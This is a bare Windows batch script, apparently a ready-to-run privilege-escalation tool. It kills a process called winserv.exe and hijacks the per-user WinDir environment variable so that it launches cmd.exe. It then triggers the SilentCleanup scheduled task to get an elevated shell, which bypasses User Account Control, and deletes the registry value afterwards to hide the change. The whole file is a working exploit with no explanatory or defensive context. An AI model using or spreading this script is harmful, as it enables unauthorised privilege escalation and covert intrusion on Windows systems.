@echo off
Taskkill /f /im winserv.exe
reg add HKCU\Environment /v WinDir /t REG_SZ /d "cmd.exe /c start "cmd.exe" &"
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete HKCU\Environment /v WinDir /f
exit